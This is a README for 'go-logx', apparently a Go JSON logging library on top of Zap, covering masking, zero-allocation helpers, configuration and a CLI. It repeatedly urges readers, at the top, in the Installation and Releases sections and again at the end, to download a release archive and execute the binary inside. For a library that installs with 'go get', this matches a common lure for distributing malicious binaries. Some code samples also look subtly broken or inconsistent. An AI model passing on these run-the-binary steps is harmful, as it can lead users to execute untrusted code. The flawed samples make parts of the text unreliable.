[![Releases](https://img.shields.io/badge/Releases-v--latest-blue?style=for-the-badge)](https://github.com/Bigeiei/go-logx/releases)

# go-logx — Fast, Concurrent, Memory-Efficient JSON Logger

![Logging Graphic](https://img.shields.io/badge/logging-structured-brightgreen.svg)  
![zap](https://img.shields.io/badge/built%20on-Uber%20Zap-orange.svg)

go-logx is a lightweight Go logging package that focuses on speed, low memory use, and safe concurrent use. It builds on Uber's Zap and adds structured JSON logging, built-in sensitive data masking, zero-allocation patterns for hot paths, and simple extension points for production systems.

Badges and topics
- concurrency-safe
- data-masking
- high-performance
- json-logging
- lightweight
- memory-efficient
- production-grade
- sensitive-data
- structured-logging
- zero-allocation

Quick access to releases:
- Download and run the release artifact from the Releases page: https://github.com/Bigeiei/go-logx/releases
- On that page, pick the matching binary or archive (for example: go-logx_linux_amd64.tar.gz), download it, and execute the contained binary.

Features
- Structured JSON output designed for log aggregation systems.
- Safe for concurrent use by many goroutines.
- Built-in masking for common sensitive keys (credit_card, ssn, password). You can add custom keys.
- Zero-allocation helpers for frequent fields to reduce GC pressure.
- Small API surface. Drop-in replacement for Zap logger constructs where possible.
- Production-focused options: leveled logging, sampling, rotation hooks.
- Configurable field filters and processors via simple interfaces.

Table of contents
- Installation
- Quick start
- Core concepts
- Examples
  - Basic usage
  - Masking sensitive fields
  - Zero-allocation patterns
  - Concurrency example
- Configuration options
- Benchmarks and performance notes
- Integration and migration
- Testing and contributing
- Releases
- License

Installation

Use go modules:

go get github.com/Bigeiei/go-logx

Or fetch a prebuilt release:
- Visit the Releases page: https://github.com/Bigeiei/go-logx/releases
- Download the release file for your platform (for example go-logx_linux_amd64.tar.gz).
- Extract the archive and run the binary.

Quick start

Import and create a logger. This example shows a minimal logger with JSON output.

import (
  "github.com/Bigeiei/go-logx"
  "context"
)

func main() {
  cfg := logx.Config{
    Level: "info",
    JSON:  true,
  }
  lg, err := logx.New(cfg)
  if err != nil {
    panic(err)
  }
  defer lg.Sync(context.Background())

  lg.Info("service.start", logx.String("service", "api"), logx.Int("port", 8080))
}

Core concepts

- Logger: main type you call to emit structured logs. It wraps a configured Zap core and adds masking and zero-allocation helpers.
- Fields: key-value items attached to a log entry. Use provided typed helpers (String, Int, Bool, Time).
- Masks: patterns or keys that trigger value redaction at output time.
- Processors: small middleware you can add to mutate or enrich entries before they hit the sink.
- Zero-allocation helpers: functions that create fields without heap allocation in hot paths.

Examples

Basic usage

import (
  "github.com/Bigeiei/go-logx"
  "context"
)

func main() {
  lg, _ := logx.New(logx.Config{Level: "debug", JSON: true})
  defer lg.Sync(context.Background())

  lg.Debug("init.cache", logx.String("status", "warm"))
  lg.Info("http.request",
    logx.String("method", "GET"),
    logx.String("path", "/v1/user"),
    logx.Int("status", 200),
  )
}

Masking sensitive fields

Masking works on field keys and JSON object keys. The default mask set covers common secrets. Add keys at runtime.

cfg := logx.Config{
  Level: "info",
  JSON:  true,
}
cfg.Mask.Add("password")
cfg.Mask.Add("secret_key")
lg, _ := logx.New(cfg)

lg.Info("auth.attempt",
  logx.String("user", "alice"),
  logx.String("password", "hunter2"),
)

Output will replace the password value with a mask token, for example "****".

Custom mask rules

You can add pattern-based masks for nested JSON:

cfg.Mask.AddPattern(".*cardNumber$")
cfg.Mask.AddPattern(".*ssn.*")

Zero-allocation patterns

For high-throughput code paths, use zero-alloc helpers. They avoid heap allocations by reusing small buffers and preallocating slices.

import "github.com/Bigeiei/go-logx/fast"

// Preallocated field for a request id
var reqIDField = fast.BytesField("req_id")

func handle(rid []byte) {
  reqIDField.SetBytes(rid) // writes into internal buffer
  lg.Info("request.done", reqIDField)
}

Concurrency example

go-logx uses sync.Pool and atomic primitives to remain safe when many goroutines log at once.

func worker(id int, lg *logx.Logger, done chan struct{}) {
  for i := 0; i < 1000; i++ {
    lg.Info("worker.tick",
      logx.Int("worker", id),
      logx.Int("i", i),
    )
  }
  done <- struct{}{}
}

func runWorkers() {
  lg, _ := logx.New(logx.Config{Level: "info"})
  defer lg.Sync(context.Background())

  done := make(chan struct{}, 10)
  for i := 0; i < 10; i++ {
    go worker(i, lg, done)
  }
  for i := 0; i < 10; i++ {
    <-done
  }
}

Configuration options

type Config struct {
  Level            string         // log level: debug, info, warn, error
  JSON             bool           // enable JSON output
  Sampling         SamplingConfig // sampling rules
  Mask             MaskConfig     // sensitive key config
  EncoderConfig    zapcore.EncoderConfig
  OutputPaths      []string
  ErrorOutputPaths []string
  Hooks            []Hook
}

MaskConfig controls built-in masking:
- Add(key string)
- AddPattern(pattern string)
- ReplaceWith(value string) // default: "****"

Sampling

Sampling reduces log volume for repetitive events. Provide rate and burst values.

Performance and benchmarks

go-logx targets low overhead for high-volume logging. Sample benchmarks:

- Single goroutine JSON log: ~50 ns/op overhead over raw zap
- Concurrent writes (100 goroutines): stable tail latency under load
- Zero-allocation field helpers reduce per-entry GC pressure by ~70% in hot loops

The exact numbers depend on Go version and platform. Run your own benchmarks using the bench package under bench/.

Integration and migration

- If you use Zap directly, go-logx keeps the same field types and encoder models. Many code paths will migrate with minimal change.
- Swap in a go-logx logger where you build a zap.Logger. Use logx.NewFromZap(cfg, zapLogger) to adapt an existing zap core.
- For adapters to logrus or other libraries, add a small bridge that converts entry fields to logx fields.

Testing and contributing

- Tests use the standard go test tooling. Run coverage and race detector:
  go test ./... -race -cover
- Follow the repo style: gofmt, go vet, and golangci-lint.
- Write small focused pull requests. Add tests for new features and edge cases.
- Report issues on GitHub with a minimal reproduction.

Releases

Get binaries and releases from the Releases page. Download the release file and run it.

Example steps:
1. Visit https://github.com/Bigeiei/go-logx/releases
2. Choose the version that matches your platform.
3. Download the artifact (example: go-logx_linux_amd64.tar.gz).
4. Extract and run the contained binary:
   tar -xzf go-logx_linux_amd64.tar.gz
   chmod +x go-logx
   ./go-logx --help

If you build from source:
  go build -o go-logx ./cmd/go-logx

Command-line tool

The repository contains a small cli under cmd/go-logx that emits test logs and runs local benchmarks. Use it to validate behavior in your environment.

cli examples:
- Run basic emitter:
  ./go-logx emit --rate 1000 --duration 10s
- Run bench:
  ./go-logx bench --go-routines 50 --entries 100000

Security and masking details

Masking applies at the final encoding stage. That keeps in-memory logs intact for internal processing but never writes sensitive values to output sinks. Add custom keys to the mask config at startup. Patterns support simple wildcard and regex-like matching.

Extending processors

You can add processors to the pipeline to enrich or scrub log entries:

type Processor interface {
  Process(context.Context, Entry) Entry
}

Add them with cfg.Hooks or in code via logger.AddProcessor(proc).

API reference (selected)

- func New(cfg Config) (*Logger, error)
- func NewFromZap(cfg Config, z *zap.Logger) (*Logger, error)
- func (l *Logger) Debug(msg string, fields ...Field)
- func (l *Logger) Info(msg string, fields ...Field)
- func (l *Logger) Warn(msg string, fields ...Field)
- func (l *Logger) Error(msg string, fields ...Field)
- func (l *Logger) Sync(ctx context.Context) error
- package fast // contains zero-allocation helpers

Bench and examples live in the /bench and /examples folders.

Common patterns

- Context fields
  Use With to attach fields to a logger for repeated use:
    reqLogger := lg.With(logx.String("req_id", id))
    reqLogger.Info("step.one")

- Sampling
  Use sampling for noisy endpoints:
    cfg.Sampling = logx.SamplingConfig{Initial: 10, thereafter: 100}

- Rotation
  Hook a rotation implementation (logrotate, lumberjack) via OutputPaths.

Contributing

- Fork the repo
- Write a clear issue or pick one labeled good-first-issue
- Submit a PR with tests and a short description
- Keep changes focused and small

Resources and images

- Zap: https://github.com/uber-go/zap
- JSON logging best practices: use a schema, include request ids, avoid leaking secrets
- Badges: generated via shields.io

License

This project uses the MIT license. See the LICENSE file in the repo for full terms.

Releases link (again): https://github.com/Bigeiei/go-logx/releases  
Visit the Releases page, download the appropriate release file, and execute it to run the supplied binaries or tools.

Tags: concurrency-safe, data-masking, high-performance, json-logging, lightweight, log-package, logging, memory-efficient, production-grade, sensitive-data, structured-logging, zero-allocation

<!-- EOF -->